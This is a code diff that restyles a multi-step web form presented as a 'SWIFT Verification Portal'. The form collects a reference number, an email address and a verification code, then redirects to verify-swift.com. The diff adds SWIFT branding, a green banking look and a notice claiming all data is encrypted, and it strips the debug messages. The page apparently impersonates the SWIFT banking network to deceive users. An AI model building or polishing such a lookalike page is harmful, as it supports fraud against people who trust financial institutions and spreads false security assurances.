@@ -3,59 +3,318 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Swift Verification</title>
+<title>SWIFT Verification Portal</title>
 <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
-    body{display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5;}
-    .container{background:#fff;padding:30px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);width:90%;max-width:400px;}
-    .step{display:none;}
-    .step.active{display:block;}
-    input{width:100%;padding:10px;margin:10px 0;border:1px solid #ccc;border-radius:6px;}
-    button{padding:10px 15px;background:#3498db;color:white;border:none;border-radius:6px;cursor:pointer;width:100%;}
-    button:disabled{background:#aaa;cursor:not-allowed;}
-    .error{color:red;margin-top:10px;display:none;font-size:14px;}
-    .success{color:green;margin-top:10px;display:none;}
-    .loading{display:none;color:#3498db;margin-top:10px;}
-    .debug{font-size:12px;color:#666;margin-top:10px;}
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Segoe UI', Arial, sans-serif;
+    }
+    
+    body {
+        background: linear-gradient(135deg, #006b3c 0%, #004d2a 100%);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    }
+    
+    .container {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(20px);
+        border-radius: 20px;
+        padding: 40px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        width: 100%;
+        max-width: 440px;
+        border: 1px solid rgba(255, 255, 255, 0.3);
+    }
+    
+    .header {
+        text-align: center;
+        margin-bottom: 30px;
+    }
+    
+    .logo {
+        width: 120px;
+        height: 40px;
+        background: #006b3c;
+        margin: 0 auto 15px;
+        border-radius: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: bold;
+        font-size: 18px;
+    }
+    
+    .header h1 {
+        color: #006b3c;
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 8px;
+    }
+    
+    .header p {
+        color: #666;
+        font-size: 14px;
+    }
+    
+    .step {
+        display: none;
+        animation: fadeIn 0.5s ease-in;
+    }
+    
+    .step.active {
+        display: block;
+    }
+    
+    .input-group {
+        margin-bottom: 20px;
+    }
+    
+    .input-group label {
+        display: block;
+        color: #333;
+        font-weight: 500;
+        margin-bottom: 8px;
+        font-size: 14px;
+    }
+    
+    input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 2px solid #e1e5e9;
+        border-radius: 12px;
+        font-size: 15px;
+        transition: all 0.3s ease;
+        background: #fff;
+    }
+    
+    input:focus {
+        outline: none;
+        border-color: #006b3c;
+        box-shadow: 0 0 0 3px rgba(0, 107, 60, 0.1);
+    }
+    
+    input::placeholder {
+        color: #a0a4a8;
+    }
+    
+    .btn {
+        width: 100%;
+        padding: 14px;
+        background: linear-gradient(135deg, #006b3c 0%, #005a32 100%);
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 10px;
+    }
+    
+    .btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(0, 107, 60, 0.3);
+    }
+    
+    .btn:disabled {
+        background: #ccc;
+        transform: none;
+        box-shadow: none;
+        cursor: not-allowed;
+    }
+    
+    .btn-secondary {
+        background: transparent;
+        border: 2px solid #006b3c;
+        color: #006b3c;
+    }
+    
+    .btn-secondary:hover {
+        background: #006b3c;
+        color: white;
+    }
+    
+    .error {
+        color: #d32f2f;
+        font-size: 13px;
+        margin-top: 8px;
+        display: none;
+        padding: 8px 12px;
+        background: rgba(211, 47, 47, 0.1);
+        border-radius: 6px;
+        border-left: 3px solid #d32f2f;
+    }
+    
+    .success {
+        color: #2e7d32;
+        font-size: 13px;
+        margin-top: 8px;
+        display: none;
+        padding: 8px 12px;
+        background: rgba(46, 125, 50, 0.1);
+        border-radius: 6px;
+        border-left: 3px solid #2e7d32;
+    }
+    
+    .loading {
+        display: none;
+        text-align: center;
+        color: #006b3c;
+        margin-top: 10px;
+    }
+    
+    .loading-spinner {
+        width: 20px;
+        height: 20px;
+        border: 2px solid #f3f3f3;
+        border-top: 2px solid #006b3c;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 8px;
+    }
+    
+    .step-indicator {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 30px;
+        gap: 8px;
+    }
+    
+    .step-dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: #e1e5e9;
+        transition: all 0.3s ease;
+    }
+    
+    .step-dot.active {
+        background: #006b3c;
+        transform: scale(1.2);
+    }
+    
+    .security-notice {
+        background: rgba(0, 107, 60, 0.05);
+        border-radius: 12px;
+        padding: 16px;
+        margin-top: 25px;
+        border-left: 4px solid #006b3c;
+    }
+    
+    .security-notice h4 {
+        color: #006b3c;
+        font-size: 13px;
+        margin-bottom: 6px;
+        font-weight: 600;
+    }
+    
+    .security-notice p {
+        color: #666;
+        font-size: 12px;
+        line-height: 1.4;
+    }
+    
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
+    /* Responsive */
+    @media (max-width: 480px) {
+        .container {
+            padding: 30px 25px;
+            margin: 10px;
+        }
+        
+        body {
+            padding: 10px;
+            background: #006b3c;
+        }
+    }
 </style>
 </head>
 <body>
 <div class="container">
+    <div class="header">
+        <div class="logo">SWIFT</div>
+        <h1>Secure Verification Portal</h1>
+        <p>Verify your account securely</p>
+    </div>
+    
+    <div class="step-indicator">
+        <div class="step-dot active" data-step="1"></div>
+        <div class="step-dot" data-step="2"></div>
+        <div class="step-dot" data-step="3"></div>
+        <div class="step-dot" data-step="4"></div>
+    </div>
+
     <!-- Step 1: Reference Number -->
     <div class="step active" id="step1">
-        <h2>Step 1: Reference Number</h2>
-        <input type="text" id="referenceNumber" placeholder="Enter COBA300525CH59279" required>
-        <button id="step1Next">Next</button>
+        <div class="input-group">
+            <label for="referenceNumber">Reference Number</label>
+            <input type="text" id="referenceNumber" placeholder="Enter COBA300525CH59279" required>
+        </div>
+        <button class="btn" id="step1Next">Continue</button>
         <div class="error" id="refError"></div>
     </div>
 
     <!-- Step 2: Email -->
     <div class="step" id="step2">
-        <h2>Step 2: Email Address</h2>
-        <input type="email" id="email" placeholder="Enter your email" required>
-        <button id="sendCode">Send Verification Code</button>
-        <div class="loading" id="emailLoading">Sending code...</div>
+        <div class="input-group">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" placeholder="Enter your email address" required>
+        </div>
+        <button class="btn" id="sendCode">Send Verification Code</button>
+        <div class="loading" id="emailLoading">
+            <div class="loading-spinner"></div>
+            Sending verification code...
+        </div>
         <div class="error" id="emailError"></div>
-        <div class="debug" id="debugInfo"></div>
     </div>
 
     <!-- Step 3: Verification Code -->
     <div class="step" id="step3">
-        <h2>Step 3: Enter Verification Code</h2>
-        <input type="text" id="codeInput" placeholder="6-digit code" maxlength="6" inputmode="numeric">
-        <button id="verifyCode">Verify Code</button>
+        <div class="input-group">
+            <label for="codeInput">Verification Code</label>
+            <input type="text" id="codeInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric">
+        </div>
+        <button class="btn" id="verifyCode">Verify Code</button>
         <div class="error" id="codeError"></div>
     </div>
 
     <!-- Step 4: Success -->
     <div class="step" id="step4">
-        <h2>Success!</h2>
-        <div class="success">Your account has been verified successfully.</div>
-        <div class="loading" id="redirectLoading">Redirecting to verify-swift.com...</div>
+        <div style="text-align: center; padding: 20px 0;">
+            <div style="font-size: 48px; color: #2e7d32; margin-bottom: 15px;">✓</div>
+            <h2 style="color: #2e7d32; margin-bottom: 10px;">Verification Successful</h2>
+            <p style="color: #666; margin-bottom: 25px;">Your account has been verified successfully</p>
+        </div>
+        <div class="loading" id="redirectLoading">
+            <div class="loading-spinner"></div>
+            Redirecting to secure portal...
+        </div>
+    </div>
+    
+    <div class="security-notice">
+        <h4>🔒 Secure Verification</h4>
+        <p>This verification process ensures the security of your SWIFT account. All data is encrypted and protected.</p>
     </div>
 </div>
 
 <script>
+// JavaScript kodu eyni qalır, sadəcə step indicator əlavə edirik
 let currentStep = 1;
 let verificationCode = '';
 let codeExpiry;
@@ -64,6 +323,12 @@ let userEmail = '';
 function showStep(step) {
     document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
     document.getElementById('step' + step).classList.add('active');
+    
+    // Step indicator update
+    document.querySelectorAll('.step-dot').forEach((dot, index) => {
+        dot.classList.toggle('active', index + 1 === step);
+    });
+    
     currentStep = step;
 }
 
@@ -104,11 +369,9 @@ document.getElementById('step1Next').addEventListener('click', () => {
 document.getElementById('sendCode').addEventListener('click', async () => {
     const email = document.getElementById('email').value.trim();
     const emailError = document.getElementById('emailError');
-    const debugInfo = document.getElementById('debugInfo');
     const sendButton = document.getElementById('sendCode');
     
     emailError.style.display = 'none';
-    debugInfo.style.display = 'none';
 
     if (email === '' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
         emailError.textContent = 'Please enter a valid email address';
@@ -148,16 +411,12 @@ document.getElementById('sendCode').addEventListener('click', async () => {
         } else {
             emailError.textContent = data.message || 'Failed to send verification code';
             emailError.style.display = 'block';
-            debugInfo.textContent = `Error details: ${JSON.stringify(data)}`;
-            debugInfo.style.display = 'block';
         }
 
     } catch (error) {
         console.error('Fetch error:', error);
         emailError.textContent = `Network error: ${error.message}. Please check console for details.`;
         emailError.style.display = 'block';
-        debugInfo.textContent = 'Make sure the function is deployed and environment variables are set.';
-        debugInfo.style.display = 'block';
     } finally {
         setLoading(sendButton, false);
     }
